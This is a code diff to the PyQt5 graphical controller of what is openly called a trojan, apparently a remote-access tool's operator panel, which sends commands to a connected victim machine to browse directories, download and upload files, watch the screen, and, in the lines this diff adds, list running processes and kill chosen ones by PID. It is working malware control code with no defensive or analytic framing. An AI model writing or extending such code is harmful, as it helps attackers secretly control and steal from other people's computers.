@@ -7,7 +7,7 @@ from threading import Thread
 from PIL.Image import frombytes
 from PyQt5 import QtWidgets
 from PyQt5.QtCore import pyqtSignal, Qt, QSize
-from PyQt5.QtGui import QPixmap
+from PyQt5.QtGui import QPixmap, QPalette
 from PyQt5.QtWidgets import QWidget, QApplication, QListWidgetItem, QHBoxLayout, QLabel, QFileDialog, QMessageBox
 
 from Detail import Ui_Form
@@ -25,6 +25,7 @@ class DetailMain(QWidget, Ui_Form):
     listSignal = pyqtSignal(list)
     pwdSignal = pyqtSignal(str)
     fileSignal = pyqtSignal(bytes)
+    threadSignal = pyqtSignal(dict)
 
     def __init__(self, trojanserver=None, ck=0):
         super().__init__()
@@ -52,6 +53,8 @@ class DetailMain(QWidget, Ui_Form):
         self.consoleSignal.connect(self.upConsole)
         self.listSignal.connect(self.displayList)
         self.listWidget.itemClicked.connect(self.enterDir)
+        self.threadSignal.connect(self.displayThread)
+        self.Threadlist.itemClicked.connect(self.deletethread)
         self.freshlistbutton.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d ls"%self.ck))
         self.backbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd .." % self.ck))
         self.hombutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd c:/" % self.ck))
@@ -63,7 +66,7 @@ class DetailMain(QWidget, Ui_Form):
         self.rename_button.clicked.connect(self.rename)
         self.uploadbutton.clicked.connect(self.upload)
         self.fileSignal.connect(self.saveFile)
-        #self.````.connect(lambda: self.trojanServer.cmdQ.put("msg %d thread" % self.ck))
+        self.startThreadctrl.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d thread" % self.ck))
 
     def waitConnection(self):
         while True:
@@ -140,6 +143,9 @@ class DetailMain(QWidget, Ui_Form):
                         res_len = struct.unpack('i', self.socket.recv(4))[0]
                         response = self.tcpPieceRecv(res_len, self.socket, 1024)
                         data = json.loads(response.decode('utf8'))
+                        print("receive thread list")
+                        print(type(data))
+                        self.threadSignal.emit(data)
                         #????self.threadSignal.emit()#
                     
                     elif ty == 'file':
@@ -217,6 +223,86 @@ class DetailMain(QWidget, Ui_Form):
         self.trojanServer.cmdQ.put("msg %d disconnect" % self.ck)
         self.disconnected()
 
+    def displayThread(self, flist):
+        print("into display Thread")
+        self.Threadlist.clear()
+        def getThreadWin(ProcessName, Pid,  Parent, PPid):
+            widget = QWidget()
+            layout_main = QHBoxLayout()
+            widget.setLayout(layout_main)
+            ProcessLabel = QLabel()
+            ProcessLabel.setFixedSize(700, 20)
+            ProcessLabel.setText(ProcessName)
+            PidLabel = QLabel()
+            PidLabel.setFixedSize(60, 20)
+            PidLabel.setText(str(Pid))
+            # RunningLabel = QLabel()
+            # RunningLabel.setFixedSize(40, 20)
+            # RunningLabel.setText(str(Running))
+            ParentLabel = QLabel()
+            ParentLabel.setFixedSize(700, 20)
+            ParentLabel.setText(Parent)
+            PPidLabel = QLabel()
+            PPidLabel.setFixedSize(60, 20)
+            PPidLabel.setText(str(PPid))
+
+            widget.ProcessLabel = ProcessLabel
+            widget.PidLabel = PidLabel
+            # widget.RunningLabel = RunningLabel
+            widget.ParentLabel = ParentLabel
+            widget.PPidLabel = PPidLabel
+
+            layout_main.addWidget(ProcessLabel)
+            layout_main.addWidget(PidLabel)
+            # layout_main.addWidget(RunningLabel)
+            layout_main.addWidget(ParentLabel)
+            layout_main.addWidget(PPidLabel)
+            return widget
+        item = QListWidgetItem()
+        item.setSizeHint(QSize(800, 40))
+        self.Threadlist.addItem(item)
+        widget = QWidget()
+        layout_main = QHBoxLayout()
+        widget.setLayout(layout_main)
+        Name = QLabel()
+        Name.setFixedSize(700, 20)
+        Name.setText("Process Name")
+        pe = QPalette()
+        pe.setColor(QPalette.WindowText,Qt.red)
+        self.label.setAutoFillBackground(True)
+        pe.setColor(QPalette.Window,Qt.blue)
+        Name.setPalette(pe)
+        Pid_2 = QLabel()
+        Pid_2.setFixedSize(60, 20)
+        Pid_2.setText("Pid")
+        Pid_2.setPalette(pe)
+        ParentName = QLabel()
+        ParentName.setFixedSize(700, 20)
+        ParentName.setText("Parent Name")
+        ParentName.setPalette(pe)
+        PPid_ = QLabel()
+        PPid_.setFixedSize(60, 20)
+        PPid_.setText("PPid")
+        PPid_.setPalette(pe)
+        widget.Name = Name
+        widget.Pid_2 = Pid_2
+        # widget.RunningLabel = RunningLabel
+        widget.ParentName = ParentName
+        widget.PPid_ = PPid_
+
+        layout_main.addWidget(Name)
+        layout_main.addWidget(Pid_2)
+        # layout_main.addWidget(RunningLabel)
+        layout_main.addWidget(ParentName)
+        layout_main.addWidget(PPid_)
+        self.Threadlist.setItemWidget(item, widget)
+        for f in flist.values():
+            item = QListWidgetItem()
+            item.setSizeHint(QSize(800, 40))
+            self.Threadlist.addItem(item)
+            widget = getThreadWin(f['Process name:'], f['PID:'],f['Parent:'],f['Parent pid:'])
+            self.Threadlist.setItemWidget(item, widget)
+
     def displayList(self, flist):
         self.listWidget.clear()
         def getWidget(name, isDir):
@@ -258,14 +344,21 @@ class DetailMain(QWidget, Ui_Form):
         if widget.isDir:
             self.trojanServer.cmdQ.put("msg %d dos cd %s" %(self.ck, name))
         else:
-            reply = QMessageBox.question(self, 'Message', '下载%s?'%name,
+            reply = QMessageBox.question(self, '提示', '下载%s?'%name,
                                          QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
 
             if reply == QMessageBox.Yes:
                 self.trojanServer.cmdQ.put("msg %d getFile %s"%(self.ck, name))
             else:
                 pass
-
+    def deletethread(self, item:QListWidgetItem = None):
+        widget = self.Threadlist.itemWidget(item)
+        _pid = widget.PidLabel.text()
+        reply = QMessageBox.question(self, '提示', '删除%s?'%_pid, QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+        if reply == QMessageBox.Yes:
+            self.trojanServer.cmdQ.put("msg %d DeleteThread %s"%(self.ck, str(_pid)))
+        else:
+            pass
 
     def picWatch(self):
         status = self.startpic.text()
